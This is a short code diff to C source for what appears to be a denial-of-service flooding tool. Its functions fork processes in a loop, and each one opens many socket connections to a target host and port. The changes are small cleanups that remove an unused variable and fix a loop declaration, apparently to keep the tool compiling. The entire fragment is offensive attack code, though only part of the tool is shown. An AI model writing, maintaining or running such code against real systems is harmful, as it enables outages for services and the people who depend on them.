@@ -84,7 +84,7 @@ static int connect_target(char *host, char *port)
 static void send_packets(char *host, char *port)
 {
     int sockets[CONNECTIONS];
-    int x, g=1, r;
+    int x, r;
 
     for (x = 0; x != CONNECTIONS; x++)
         sockets[x]=0;
@@ -108,7 +108,7 @@ static void send_packets(char *host, char *port)
 
 void attack(char *host, char *port)
 {
-    for (x = 0; x != THREADS; x++) {
+    for (int x = 0; x != THREADS; x++) {
         if (fork())
             send_packets(host, port);
         usleep(200000);
